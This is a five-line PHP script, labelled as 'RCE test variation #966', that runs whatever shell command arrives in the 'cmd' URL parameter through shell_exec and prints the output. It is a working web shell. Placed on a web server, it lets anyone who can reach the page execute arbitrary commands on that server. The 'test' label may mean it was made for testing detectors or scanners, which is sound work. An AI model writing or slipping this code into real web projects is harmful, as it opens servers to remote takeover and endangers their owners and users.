<?php
// RCE test variation #966
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>